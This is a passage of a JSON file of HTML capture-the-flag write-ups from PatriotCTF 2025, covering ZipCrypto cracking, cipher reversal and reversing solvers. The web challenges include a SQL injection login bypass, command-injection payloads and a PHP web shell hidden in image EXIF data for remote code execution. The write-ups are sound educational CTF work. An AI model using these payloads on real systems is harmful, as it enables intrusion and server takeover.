data[0x2040:0x2062]</p>\n<p>keystream = chacha20_block(key, 1, nonce)\n    print(bytes(a ^ b for a, b in zip(cipher, keystream)).decode())\n</code>``</p>\n<p>5. The Flag</p>\n<p>Running the script produced the flag:</p>\n<p>flag{iN1_f!ni_Min1_m0...1_$e3_yOu}</p>\n"
            }
        ]
    },
    "HeroCTF v7": {
        "rank": "111th place",
        "description": "Competed in various challenge categories including web exploitation, cryptography, and reverse engineering.",
        "challenges": []
    },
    "PatriotCTF 2025": {
        "rank": "398th place",
        "description": "Comprehensive CTF with diverse challenge categories.",
        "challenges": [
            {
                "id": "burger-king",
                "title": "Burger King",
                "category": "Forensics",
                "tags": [
                    "crypto",
                    "web",
                    "http",
                    "crack",
                    "forensics",
                    "image"
                ],
                "writeup": "<h4>1. Reconnaissance</h4>\n<p>We were provided with an encrypted archive, <code>BurgerKing.zip</code>, and a partial file, <code>partial.svg</code>. The challenge description hinted at a \"forensics team\" called \"Burger King Crackers,\" a reference to the <strong>bkcrack</strong> (Biham-Kocher Crack) tool used for exploiting legacy Zip encryption.</p>\n<p>First, we analyzed the archive to check the encryption and compression methods:</p>\n<p>Bash</p>\n<pre><code class=\"\">unzip -v BurgerKing.zip\n</code></pre>\n<p><strong>Findings:</strong></p>\n<ul>\n<li><strong>Encryption:</strong> Legacy ZipCrypto (implied by the vulnerability context).</li>\n<li><strong>Compression:</strong> <code>Stored</code> (0% compression).</li>\n<li><strong>Files:</strong> 5 SVG files (<code>Hole.svg</code>, <code>LockAndKey.svg</code>, <code>Space.svg</code>, <code>Webs.svg</code>, <code>SVGsSuck.svg</code>).</li>\n</ul>\nThe fact that the files were <strong>Stored</strong> meant the raw plaintext bytes would match the encrypted bytes exactly, making a <strong>Known Plaintext Attack (KPA)</strong> trivial.\n<h4>2. Plaintext Preparation</h4>\n<p>We examined the provided <code>partial.svg</code> file:</p>\n<p>Bash</p>\n<pre><code class=\"\">cat partial.svg\n&lt;h2&gt;Output: &lt;svg xmlns=\"http://www.w3.org/2000/svg\"&lt;/h2&gt;\n</code></pre>\n<p>This string corresponds to the standard XML header found at the beginning of almost all SVG files. Since we know the start of the plaintext for the encrypted files, we can derive the internal encryption keys.</p>\n<p>We ensured the plaintext file was clean (no extra newlines) for the attack:</p>\n<p>Bash</p>\n<pre><code class=\"\">printf '&lt;svg xmlns=\"http://www.w3.org/2000/svg\"' &gt; partial.svg\n</code></pre>\n<h4>3. Cracking the Keys</h4>\n<p>We used <code>bkcrack</code> to perform the Known Plaintext Attack. We targeted <code>Space.svg</code> (though any of the SVGs would likely work) using the clean plaintext file.</p>\n<p>Bash</p>\n<pre><code class=\"\">./bkcrack -C BurgerKing.zip -c Space.svg -p partial.svg\n</code></pre>\n<p>The attack succeeded quickly because there was no compression to guess. <strong>Recovered Keys:</strong> <code>b9540c69 069a11f9 fd31648f</code></p>\n<h4>4. Decryption and Extraction</h4>\n<p>With the internal keys recovered, the password was no longer needed. We generated a new, unlocked version of the archive with a known password (<code>easy</code>) to extract all files at once.</p>\n<p>Bash</p>\n<pre><code class=\"\">./bkcrack -C BurgerKing.zip -k b9540c69 069a11f9 fd31648f -U unlocked.zip easy\nunzip unlocked.zip\n</code></pre>\n<h4>5. Retrieving the Flag</h4>\n<p>After extracting the files, we examined <code>SVGsSuck.svg</code> (the largest file in the archive). Opening the image revealed the flag written clearly within the graphic.</p>\n<p><strong>Flag:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">CACI{Y0U_F0UND_M3!}\n</code></pre>\n[[PatriotCTF-2025]]\n"
            },
            {
                "id": "cipher-from-hell",
                "title": "Cipher from Hell",
                "category": "Cryptography",
                "tags": [
                    "crypto",
                    "reverse"
                ],
                "writeup": "<h3>Overview</h3>\n<p>We are given an encryption script <code>encryptor.py</code> that transforms an input flag into an encrypted file. The encryption process is inspired by Malbolge's \"crazy operation\" and involves base conversions and matrix lookups. Our goal is to reverse this process to recover the original flag from the <code>encrypted</code> file.</p>\n<h3>Encryption Analysis</h3>\n<p>Let's break down the encryption process:</p>\n<p>1. <strong>Input Conversion</strong>: The input string is converted to bytes and then to a large integer <code>s</code>.</p>\n<p>2. <strong>Base-3 Conversion</strong>: The integer <code>s</code> is treated as a base-3 number.</p>\n<p>3. <strong>Matrix Mapping</strong>: A 3\u00d73 matrix <code>o</code> is used to map pairs of base-3 digits to single base-9 digits:</p>\n<p>text</p>\n<p>o = (\n    (6, 0, 7),\n    (8, 2, 1), \n    (5, 4, 3)\n)</p>\n<p>1. <strong>Digit Processing</strong>: The base-3 digits are processed in pairs from most significant to least significant. For each pair <code>(a,b)</code>, the value <code>o[a][b]</code> is computed and added to the output.</p>\n<p>2. <strong>Output</strong>: The resulting base-9 number is written to the <code>encrypted</code> file as bytes.</p>\n<p>The key insight is that the encryption processes the base-3 digits <strong>in reverse order</strong> (most significant first), which we must account for during decryption.</p>\n<h3>Decryption Strategy</h3>\n<p>To reverse the encryption, we need to:</p>\n<p>1. <strong>Read the encrypted file</strong> and convert it back to an integer <code>ss</code>.</p>\n<p>2. <strong>Convert <code>ss</code> to base-9 digits</strong> (this gives us the output of the matrix lookups).</p>\n<p>3. <strong>Create a reverse mapping</strong> from matrix output values to input pairs.</p>\n<p>4. <strong>Map each base-9 digit back</strong> to its corresponding pair of base-3 digits.</p>\n<p>5. <strong>Reconstruct the base-3 number</strong> from these digit pairs.</p>\n<p>6. <strong>Convert the base-3 number back</strong> to bytes to recover the flag.</p>\n<h3>Solution Implementation</h3>\n<p>Here's the step-by-step decryption process:</p>\n<h4>Step 1: Read the Encrypted File</h4>\n<p>python</p>\n<p>with open(\"encrypted\", 'rb') as f:\n    encrypted_bytes = f.read()\nss = int.from_bytes(encrypted_bytes, byteorder='big')</p>\n<h4>Step 2: Convert to Base-9 Digits</h4>\n<p>python</p>\n<p>base9_digits = []\ntemp = ss\nwhile temp > 0:\n    base9_digits.append(temp % 9)\n    temp //= 9\nbase9_digits.reverse()</p>\n<h4>Step 3: Create Reverse Mapping</h4>\n<p>We need to find for each output value <code>v</code>, which input pair <code>(i,j)</code> satisfies <code>o[i][j] = v</code>:</p>\n<p>python</p>\n<p>reverse_o = {}\nfor i in range(3):\n    for j in range(3):\n        reverse_o[o[i][j]] = (i, j)</p>\n<p>This gives us:</p>\n<ul>\n<li><code>0 \u2192 (0,1)</code></li>\n<li><code>1 \u2192 (1,2)</code></li>\n<li><code>2 \u2192 (1,1)</code></li>\n<li><code>3 \u2192 (2,2)</code></li>\n<li><code>4 \u2192 (2,1)</code></li>\n<li><code>5 \u2192 (2,0)</code></li>\n<li><code>6 \u2192 (0,0)</code></li>\n<li><code>7 \u2192 (0,2)</code></li>\n<li><code>8 \u2192 (1,0)</code></li>\n</ul>\n<h4>Step 4: Map Base-9 Digits to Base-3 Pairs</h4>\n<p>python</p>\n<p>pairs = [reverse_o[d] for d in base9_digits]</p>\n<h4>Step 5: Reconstruct Base-3 Number</h4>\n<p>The encryption processes digits from most significant to least significant, so we need to carefully reconstruct the base-3 number:</p>\n<p>python</p>\n<h2>The pairs represent: (most_significant_digit, least_significant_digit), </h2>\n<h2>(second_most_significant, second_least_significant), etc.</h2>\nn = len(pairs) * 2\nbase3_digits = [0] * n\n<p>for i, (l, r) in enumerate(pairs):\n    base3_digits[i] = l           # Fill from left (most significant)\n    base3_digits[n-1-i] = r       # Fill from right (least significant)</p>\n<h2>Convert base-3 digits to integer</h2>\ns_decrypted = 0\nfor digit in base3_digits:\n    s_decrypted = s_decrypted * 3 + digit\n<h4>Step 6: Convert to Bytes and Decode</h4>\n<p>python</p>\n<p>byte_length = (s_decrypted.bit_length() + 7) // 8\nflag_bytes = s_decrypted.to_bytes(byte_length, byteorder='big')\nflag = flag_bytes.decode(errors='ignore')</p>\n<h3>Final Script</h3>\n<p>``<code> python\nimport math</p>\n<p>def decrypt():\n    # Read the encrypted file\n    with open(\"encrypted\", 'rb') as f:\n        encrypted_bytes = f.read()</p>\n<p># Convert to integer\n    ss = int.from_bytes(encrypted_bytes, byteorder='big')</p>\n<p># The mapping matrix used in encryption\n    o = (\n        (6, 0, 7),\n        (8, 2, 1),\n        (5, 4, 3)\n    )</p>\n<p># Create reverse mapping: from output value to (i,j) coordinates\n    reverse_o = {}\n    for i in range(3):\n        for j in range(3):\n            reverse_o[o[i][j]] = (i, j)</p>\n<p># Convert integer ss to base-9 digits\n    if ss == 0:\n        base9_digits = [0]\n    else:\n        base9_digits = []\n        temp = ss\n        while temp > 0:\n            base9_digits.append(temp % 9)\n            temp //= 9\n        base9_digits.reverse()  # now most significant first</p>\n<p># Now, for each base-9 digit, get the pair (l, r)\n    pairs = []\n    for digit in base9_digits:\n        if digit not in reverse_o:\n            raise ValueError(f\"Invalid digit {digit} in base-9 representation\")\n        pairs.append(reverse_o[digit])</p>\n<p># Number of pairs\n    m = len(pairs)\n    n = 2 * m  # number of base-3 digits</p>\n<p># Create an array for base-3 digits\n    base3_digits = [0] * n\n    for i, (l, r) in enumerate(pairs):\n        base3_digits[i] = l\n        base3_digits[n - 1 - i] = r</p>\n<p># Convert base-3 digits to integer\n    s_decrypted = 0\n    for digit in base3_digits:\n        s_decrypted = s_decrypted * 3 + digit</p>\n<p># Convert integer to bytes\n    if s_decrypted == 0:\n        byte_length = 1\n    else:\n        byte_length = (s_decrypted.bit_length() + 7) // 8</p>\n<p>flag_bytes = s_decrypted.to_bytes(byte_length, byteorder='big')</p>\n<p>return flag_bytes.decode(errors='ignore')</p>\n<p>if __name__ == '__main__':\n    flag = decrypt()\n    print(f\"Recovered flag: {flag}\")\n</code>`<code>\n<h3>Flag Recovery</h3></p>\n<p>Running this decryption process on the provided </code>encrypted` file reveals the flag:</p>\n<p>pctf{a_l3ss_cr4zy_tr1tw1s3_op3r4ti0n_f37d4b}</p>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "connection-tester",
                "title": "Connection Tester",
                "category": "Web Exploitation",
                "tags": [
                    "http",
                    "cookie",
                    "sql",
                    "injection"
                ],
                "writeup": "<p><strong>Writeup for \"Connection Tester\" challenge:</strong></p>\n<p>1.  <strong>Initial Reconnaissance:</strong> Accessed <code>http://18.212.136.134:9080/</code>. It redirected to <code>/login</code>.\n2.  <strong>Authentication Bypass (SQL Injection):</strong>\n<ul>\n<li>  Inspected the <code>/login</code> page and found a standard username/password form.</li>\n<li>  Attempted SQL injection with <code>username=' OR 1=1 --</code> and <code>password=password</code>.</li>\n<li>  Login was successful, redirecting to <code>/dashboard</code>.</li>\n</ul>\n3.  <strong>Session Management:</strong>\n<ul>\n<li>  Used <code>curl -c cookies.txt</code> to save the session cookie after successful login.</li>\n<li>  Accessed <code>/dashboard</code> using <code>curl -b cookies.txt</code>.</li>\n</ul>\n4.  <strong>Command Injection Discovery:</strong>\n<ul>\n<li>  The dashboard presented a \"Connectivity Tester\" with a \"Target Address\" input.</li>\n<li>  This is a classic command injection vector.</li>\n<li>  Tested with <code>address=127.0.0.1; ls</code>. The output indicated <code>ls...: not found</code>, suggesting an appended <code>...</code>.</li>\n</ul>\n5.  <strong>Command Injection Exploitation:</strong>\n<ul>\n<li>  Used <code>address=127.0.0.1; ls -la #</code> to comment out the appended <code>...</code>.</li>\n<li>  Successfully executed <code>ls -la</code> and obtained a directory listing, revealing <code>flag.txt</code>.</li>\n<li>  Used <code>address=127.0.0.1; cat flag.txt #</code> to read the flag.</li>\n</ul>\n6.  <strong>Flag:</strong> <code>PCTF{C0nn3cti0n_S3cured}</code></p>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "reverse-metadata-1",
                "title": "Reverse Metadata-1",
                "category": "Miscellaneous",
                "tags": [
                    "web",
                    "http",
                    "image",
                    "misc"
                ],
                "writeup": "<p>misc\n<h3>1. Overview</h3></p>\n<p>The target was a web application running on port <code>9090</code> that allowed users to upload image files. The application verified the file header (Magic Bytes) to ensure it was an image but failed to sanitize metadata or strictly enforce file extensions. This allowed for a <strong>Metadata Polyglot Attack</strong> leading to <strong>Remote Code Execution (RCE)</strong>.</p>\n<h3>2. Reconnaissance</h3>\n<ul>\n<li><strong>Discovery:</strong> Found an upload form at <code>http://18.212.136.134:9090/</code>.</li>\n<li><strong>Behavior:</strong> The server accepted image uploads (JPG/PNG) and displayed them.</li>\n<li><strong>Vulnerability Detection:</strong> We suspected the server was parsing metadata (EXIF) without sanitization.</li>\n</ul>\n<h3>3. Exploitation</h3>\n<p>We used a \"Polyglot\" file\u2014a valid JPEG image that contained hidden PHP code in its metadata tags.</p>\n<h4>Step 1: Payload Creation</h4>\n<p>Using <code>exiftool</code>, we injected a PHP web shell into the <code>Comment</code> tag of a standard image.</p>\n<p><strong>Command:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">exiftool -Comment='&lt;?php system($_GET[\"cmd\"]); ?&gt;' cat.jpg\n</code></pre>\n<h4>Step 2: Extension Bypass</h4>\n<p>The server checked if the file _started_ like an image (Magic Bytes <code>FF D8 FF</code>) but allowed the file extension to be changed. We renamed the file to force the server to process it as a PHP script.</p>\n<p><strong>Command:</strong></p>\n<p>Bash</p>\n<pre><code class=\"\">mv cat.jpg cat.php\n</code></pre>\n<h4>Step 3: Execution</h4>\n<p>We uploaded <code>cat.php</code>. The server accepted it because of the valid JPEG header. We then accessed the file via the browser, passing commands through the <code>cmd</code> parameter.</p>\n<p><strong>URL:</strong> <code>http://18.212.136.134:9090/uploads/cat.php?cmd=id</code></p>\n<p><strong>Response:</strong> The server executed the embedded PHP code and returned: <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>\n<h3>4. Flag Capture</h3>\n<p>With RCE established, we enumerated the file system.</p>\n<p>1. <strong>Located Flag Directory:</strong> <code>?cmd=ls -la /</code> _Result:_ Found a non-standard directory named <code>/flags</code>.</p>\n<p>2. <strong>Located Flag File:</strong> <code>?cmd=ls -la /flags</code> _Result:_ Found <code>root.txt</code>.</p>\n<p>3. <strong>Retrieved Flag:</strong> <code>?cmd=cat /flags/root.txt</code></p>\n<p><strong>Final Flag:</strong> <code>MASONCC{images_give_us_bash?}</code></p>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "reverse-metadata-2",
                "title": "Reverse Metadata-2",
                "category": "Miscellaneous",
                "tags": [
                    "image",
                    "disk"
                ],
                "writeup": "<h3>1. Executive Summary</h3>\n<p>After achieving initial Remote Code Execution (RCE) via an image polyglot upload, the objective was to locate a \"deleted\" flag hidden on the system. While the challenge environment contained a vulnerable Cron Job running <code>exiftool</code> as root (suggesting a CVE-2021-22204 exploit path), we discovered the flag exposed in plain text within the process list. The vulnerability stemmed from passing sensitive data (the flag) directly into command-line arguments, which are readable by all users on standard Linux configurations.</p>\n<h3>2. Initial Access</h3>\n<p>We established a foothold on the server as the <code>www-data</code> user by uploading a malicious PHP file disguised as a JPEG image (<code>cat.php</code>). This allowed us to execute system commands via the browser.</p>\n<h3>3. Enumeration</h3>\n<p>We began standard Linux enumeration to identify background services, looking for the script mentioned in the challenge description (\"processes uploaded images... every few minutes\").</p>\n<p>We ran the process list command to see what was running as <strong>root</strong>:</p>\n<p>Bash</p>\n<pre><code class=\"\">ps -aux | grep root\n</code></pre>\n<h3>4. The Discovery</h3>\n<p>The output of the process list revealed a critical security flaw. Instead of running a python script from a file (e.g., <code>python3 /root/script.py</code>), the root user was running a Python \"one-liner\" passed directly via the <code>-c</code> command argument.</p>\n<p><strong>Output:</strong></p>\n<p>Plaintext</p>\n<pre><code class=\"\">root      15  0.0  0.0  12136  7964 ?        S    08:30   0:00 python3 -c  import time, os  FLAG=\"/tmp/flag.txt\"  # create flag file f = open(FLAG, \"w\") f.write(\"PCTF{hidden_in_depths}\\n\") f.flush()  # unlink instantly (file disappears from /tmp) os.unlink(FLAG)  # keep process alive so FD stays in RAM while True:     time.sleep(100)\n</code></pre>\n<h4>Breakdown of the Vulnerable Script:</h4>\n<p>1. <strong><code>f.write(\"PCTF{hidden_in_depths}\\n\")</code></strong>: The flag was hardcoded into the script logic.</p>\n<p>2. <strong><code>os.unlink(FLAG)</code></strong>: The script immediately deleted the file from the disk. This effectively prevented us from finding it using <code>ls</code> or <code>find</code>.</p>\n<p>3. <strong><code>while True: time.sleep(100)</code></strong>: The script kept running indefinitely to keep the process alive.</p>\n<h3>5. The Vulnerability: Command Line Argument Leaks</h3>\n<p>On Linux systems, the full command line used to start a process is stored in <code>/proc/[PID]/cmdline</code>. By default, any user (including our low-privileged <code>www-data</code> user) can read the process list and arguments of other users, including root.</p>\n<p>Because the developer included the <strong>source code</strong> (containing the flag) in the command arguments (<code>python3 -c \"...\"</code>), the flag was leaked to the process table.</p>\n<h3>6. Conclusion & Mitigation</h3>\n<p>We successfully retrieved the flag <code>PCTF{hidden_in_depths}</code> without needing to escalate privileges or exploit the ExifTool vulnerability.</p>\n<p><strong>Intended Solution vs. Our Solution:</strong></p>\n<ul>\n<li><strong>Intended:</strong> Exploit the root cron job running <code>exiftool</code> (CVE-2021-22204) to copy the deleted file from <code>/root/.local/share/Trash</code>.</li>\n<li><strong>Actual:</strong> Found the flag in the process listing due to insecure scripting practices.</li>\n</ul>\n<strong>Remediation:</strong> To prevent this, secrets should never be passed as command-line arguments. The script should have been saved to a file (readable only by root) and executed as <code>python3 /path/to/script.py</code>. Additionally, server hardening (mounting <code>/proc</code> with <code>hidepid=2</code>) would prevent users from seeing processes belonging to other users.\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "space-pirates-1",
                "title": "Space Pirates-1",
                "category": "Reverse Engineering",
                "tags": [
                    "rsa",
                    "xor",
                    "buffer",
                    "overflow",
                    "reverse"
                ],
                "writeup": "<h3>Challenge Overview</h3>\n<p>The challenge provides a C program (<code>challenge.c</code>) that takes a 30-character command-line argument as input. It then performs a series of transformations on this input and compares the result to a hardcoded target value. If the transformed input matches the target, the original input is the flag, and the program prints a success message.</p>\n<p>The core of the challenge lies in understanding the transformations and reversing them to find the correct input that produces the target value.</p>\n<h3>Analyzing the Transformations</h3>\n<p>The <code>challenge.c</code> program applies four distinct operations to the input string. Let's examine them in the order they are applied:</p>\n<p>1.  <strong>XOR with a Rotating Key:</strong> Each byte of the input is XORed with a byte from a 5-byte key (<code>XOR_KEY</code>). The key byte is selected based on the position of the input byte, cycling through the key.</p>\n<pre><code class=\"c\">    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] ^= XOR_KEY[i % 5];\n    }\n    </code></pre>\n<p>2.  <strong>Swap Adjacent Byte Pairs:</strong> The program swaps every pair of adjacent bytes. For example, the bytes at indices 0 and 1 are swapped, then the bytes at indices 2 and 3 are swapped, and so on.</p>\n<pre><code class=\"c\">    for (int i = 0; i &lt; FLAG_LEN; i += 2) {\n        uint8_t temp = buffer[i];\n        buffer[i] = buffer[i + 1];\n        buffer[i + 1] = temp;\n    }\n    </code></pre>\n<p>3.  <strong>Add Magic Constant:</strong> A constant value (<code>MAGIC_ADD</code>, which is <code>0x2A</code>) is added to each byte. The addition is performed modulo 256 to handle overflow.</p>\n<pre><code class=\"c\">    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] = (buffer[i] + MAGIC_ADD) % 256;\n    }\n    </code></pre>\n<p>4.  <strong>XOR with Position:</strong> Each byte is XORed with its own index in the array.</p>\n<pre><code class=\"c\">    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] ^= i;\n    }\n    </code></pre>\n<p>After these transformations, the resulting <code>buffer</code> is compared with the <code>TARGET</code> array.</p>\n<h3>The Reversal Strategy</h3>\n<p>To find the flag, we need to reverse these operations, starting from the <code>TARGET</code> value and working our way back to the original input. The key is to apply the inverse of each operation in the reverse order.</p>\n<p>Here's the reversal plan:</p>\n<p>1.  <strong>Reverse XOR with Position:</strong> The inverse of XORing with a value is XORing with the same value again. So, we'll XOR each byte of the <code>TARGET</code> array with its index.</p>\n<p>2.  <strong>Reverse Add Magic Constant:</strong> The inverse of adding a constant is subtracting the same constant. We'll subtract <code>MAGIC_ADD</code> from each byte, again using modulo 256 arithmetic.</p>\n<p>3.  <strong>Reverse Swap Adjacent Byte Pairs:</strong> The inverse of swapping pairs is... swapping them again! This operation is its own inverse.</p>\n<p>4.  <strong>Reverse XOR with Rotating Key:</strong> Similar to the position XOR, we'll XOR each byte with the corresponding byte from the <code>XOR_KEY</code>.</p>\n<h3>The Solver</h3>\n<p>The provided <code>solver.c</code> program implements this reversal strategy. Let's look at the code:</p>\n<pre><code class=\"c\">#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdint.h&gt;\n<p>#define FLAG_LEN 30\nconst uint8_t TARGET[FLAG_LEN] = {\n    0x5A,0x3A,0x5B,0x9C,0x98,0x73,0xAE,0x32,0x25,0x47,0x48,0x51,0x6C,0x71,0x3A,0x62,0xB8,0x7B,0x63,0x57,0x25,0x89,0x58,0xBF,0x78,0x34,0x98,0x71,0x68,0x59\n};</p>\n<p>const uint8_t XOR_KEY[5] = {0x42, 0x73, 0x21, 0x69, 0x37};\nconst uint8_t MAGIC_ADD = 0x2A;</p>\n<p>int main() {\n    uint8_t buffer[FLAG_LEN];\n    memcpy(buffer, TARGET, FLAG_LEN);</p>\n<p>// Reverse Operation 4: XOR each byte with its position\n    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] ^= i;\n    }</p>\n<p>// Reverse Operation 3: Subtract magic constant (mod 256)\n    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] = (buffer[i] - MAGIC_ADD) % 256;\n    }</p>\n<p>// Reverse Operation 2: Swap adjacent byte pairs\n    for (int i = 0; i &lt; FLAG_LEN; i += 2) {\n        uint8_t temp = buffer[i];\n        buffer[i] = buffer[i + 1];\n        buffer[i + 1] = temp;\n    }</p>\n<p>// Reverse Operation 1: XOR with rotating key\n    for (int i = 0; i &lt; FLAG_LEN; i++) {\n        buffer[i] ^= XOR_KEY[i % 5];\n    }</p>\n<p>printf(\"Flag: %s\\n\", buffer);</p>\n<p>return 0;\n}\n</code></pre></p>\n<h3>The Solution</h3>\n<p>Compiling and running the <code>solver.c</code> program will print the flag:</p>\n<pre><code class=\"bash\">gcc solver.c -o solver\n./solver\n</code></pre>\n<p>This will output:</p>\n<pre><code class=\"\">Flag: PCTF{0x_M4rks_tH3_sp0t_M4t3ys}\n</code></pre>\n<h3>Conclusion</h3>\n<p>The \"Space Pirates\" challenge was a fun and classic reverse engineering problem. By carefully analyzing the transformations and applying their inverses in the reverse order, we were able to successfully recover the flag.\n[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "space-pirates-2",
                "title": "Space Pirates-2",
                "category": "Reverse Engineering",
                "tags": [
                    "cipher",
                    "xor",
                    "reverse"
                ],
                "writeup": "<p>The challenge is a Rust program that takes a 32-byte string as input, applies a series of six transformations to it, and compares the result to a hardcoded target value. To find the flag, we must reverse these transformations, starting from the target value, to recover the original input.</p>\n<p>The script <code>main.rs</code> helpfully describes each transformation and notes that they are all bijections, meaning they are all reversible.</p>\n<p>The transformations are applied in this order:\n1. <code>apply_quantum_cipher_v2</code>: XORs bytes with a 5-byte rotating key.\n2. <code>apply_stellar_rotation</code>: Rotates bytes left based on their position.\n3. <code>apply_spatial_transposition</code>: Swaps adjacent byte pairs.\n4. <code>apply_gravitational_shift_v2</code>: Subtracts a constant from each byte.\n5. <code>apply_temporal_inversion</code>: Reverses bytes in 5-byte chunks.\n6. <code>apply_coordinate_calibration_v2</code>: XORs each byte with its index squared.</p>\n<p>To solve the challenge, we must apply the inverse of these operations in the reverse order (6 down to 1) to the <code>TARGET</code> array.</p>\n<p>The inverse operations are:\n1. <strong>Reverse Coordinate Calibration</strong>: XOR is its own inverse, so we XOR each byte with its index squared.\n2. <strong>Reverse Temporal Inversion</strong>: Reversing is its own inverse, so we reverse the bytes in 5-byte chunks again.\n3. <strong>Reverse Gravitational Shift</strong>: The inverse of subtraction is addition. We add the <code>MAGIC_SUB</code> constant to each byte.\n4. <strong>Reverse Spatial Transposition</strong>: Swapping is its own inverse. We swap adjacent pairs again.\n5. <strong>Reverse Stellar Rotation</strong>: The inverse of a left rotation is a right rotation. We rotate each byte right by the same amount it was rotated left.\n6. <strong>Reverse Quantum Cipher</strong>: XOR is its own inverse. We XOR each byte with the corresponding key byte again.</p>\n<p>A solver program was created (<code>solve.rs</code>) that contained the <code>TARGET</code> data and the inverse functions. Running this program decrypts the <code>TARGET</code> array and prints the flag.</p>\n<p>Flag: PCTF{Y0U_F0UND_TH3_P1R4T3_B00TY}\n[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "space-pirates-3",
                "title": "Space Pirates-3",
                "category": "Reverse Engineering",
                "tags": [
                    "rsa",
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse"
                ],
                "writeup": "<p>This writeup explains how to solve the \"Space Pirates 3\" CTF challenge.</p>\n<p>The challenge is a Go program that takes a 30-character string as input and encrypts it through a series of six operations. The goal is to find the input string that produces a specific target hash.</p>\n<p>The six operations are:</p>\n<p>1.  <code>applyUltimateQuantumCipher</code>: XORs the input with a 7-byte key.\n2.  <code>applyStellarRotationV2</code>: Rotates each byte to the left by a specific amount based on its position.\n3.  <code>applySpatialTransposition</code>: Swaps every two adjacent bytes.\n4.  <code>applyGravitationalShiftV3</code>: Subtracts a constant value from each byte.\n5.  <code>applyTemporalInversionV2</code>: Reverses the order of the bytes in 6-byte chunks.\n6.  <code>applyCoordinateCalibrationV3</code>: XORs each byte with a value derived from its position in the string.</p>\n<p>To solve the challenge, we need to reverse these operations in the reverse order they were applied. This means starting with the target hash and applying the inverse of each operation, from step 6 back to step 1.</p>\n<p>The inverse operations are:</p>\n<p>1.  <code>reverseCoordinateCalibrationV3</code>: XOR each byte with the same position-derived value. This is the same as the original operation, as XOR is its own inverse.\n2.  <code>reverseTemporalInversionV2</code>: Reverse the bytes in 6-byte chunks again. This is also the same as the original operation.\n3.  <code>reverseGravitationalShiftV3</code>: Add the constant value to each byte.\n4.  <code>reverseSpatialTransposition</code>: Swap every two adjacent bytes again. This is the same as the original operation.\n5.  <code>reverseStellarRotationV2</code>: Rotate each byte to the right by the same amount.\n6.  <code>reverseUltimateQuantumCipher</code>: XOR the input with the same 7-byte key.</p>\n<p>By applying these inverse operations to the target hash, we can recover the original input string, which is the flag.</p>\n<p>The following Go program implements this logic:</p>\n<pre><code class=\"go\">package main\n<p>import \"fmt\"</p>\n<p>// The target encrypted vault combination (what we want the transformed input to become)\nvar target = [30]byte{\n\t0x60, 0x6D, 0x5D, 0x97, 0x2C, 0x04, 0xAF, 0x7C, 0xE2, 0x9E, 0x77, 0x85, 0xD1, 0x0F, 0x1D, 0x17, 0xD4, 0x30, 0xB7, 0x48, 0xDC, 0x48, 0x36, 0xC1, 0xCA, 0x28, 0xE1, 0x37, 0x58, 0x0F,\n}</p>\n<p>// The Pirate King's ULTIMATE XOR key (7 bytes - prime number for better mixing!)\nvar xorKey = [7]byte{0xC7, 0x2E, 0x89, 0x51, 0xB4, 0x6D, 0x1F}</p>\n<p>// NEW: Rotation pattern (8 bytes, includes rotation by 0 which is identity)\nvar rotationPattern = [8]uint{7, 5, 3, 1, 6, 4, 2, 0}</p>\n<p>// The Pirate King's subtraction constant (much larger than before!)\nconst magicSub byte = 0x93</p>\n<p>// Chunk size for reversal (changed from 5 to 6!)\nconst chunkSize = 6</p>\n<p>// rotateRight rotates a byte right by n positions (inverse of rotateLeft)\nfunc rotateRight(b byte, n uint) byte {\n\tn = n % 8 // Ensure n is in range [0,7]\n\treturn (b &gt;&gt; n) | (b &lt;&lt; (8 - n))\n}</p>\n<p>// Inverse of OPERATION 6: applyCoordinateCalibrationV3\nfunc reverseCoordinateCalibrationV3(buffer []byte) {\n\tfor i := range buffer {\n\t\tpositionValue := ((i * i) + i) % 256\n\t\tbuffer[i] ^= byte(positionValue)\n\t}\n}</p>\n<p>// Inverse of OPERATION 5: applyTemporalInversionV2\nfunc reverseTemporalInversionV2(buffer []byte) {\n\tfor chunkStart := 0; chunkStart &lt; len(buffer); chunkStart += chunkSize {\n\t\tchunkEnd := chunkStart + chunkSize\n\t\tif chunkEnd &gt; len(buffer) {\n\t\t\tchunkEnd = len(buffer)\n\t\t}\n\t\tfor i, j := chunkStart, chunkEnd-1; i &lt; j; i, j = i+1, j-1 {\n\t\t\tbuffer[i], buffer[j] = buffer[j], buffer[i]\n\t\t}\n\t}\n}</p>\n<p>// Inverse of OPERATION 4: applyGravitationalShiftV3\nfunc reverseGravitationalShiftV3(buffer []byte) {\n\tfor i := range buffer {\n\t\tbuffer[i] += magicSub\n\t}\n}</p>\n<p>// Inverse of OPERATION 3: applySpatialTransposition\nfunc reverseSpatialTransposition(buffer []byte) {\n\tfor i := 0; i &lt; len(buffer)-1; i += 2 {\n\t\tbuffer[i], buffer[i+1] = buffer[i+1], buffer[i]\n\t}\n}</p>\n<p>// Inverse of OPERATION 2: applyStellarRotationV2\nfunc reverseStellarRotationV2(buffer []byte) {\n\tfor i := range buffer {\n\t\trotation := rotationPattern[i%len(rotationPattern)]\n\t\tbuffer[i] = rotateRight(buffer[i], rotation)\n\t}\n}</p>\n<p>// Inverse of OPERATION 1: applyUltimateQuantumCipher\nfunc reverseUltimateQuantumCipher(buffer []byte) {\n\tfor i := range buffer {\n\t\tbuffer[i] ^= xorKey[i%len(xorKey)]\n\t}\n}</p>\n<p>func main() {\n\tbuffer := target[:]</p>\n<p>// Apply inverse operations in reverse 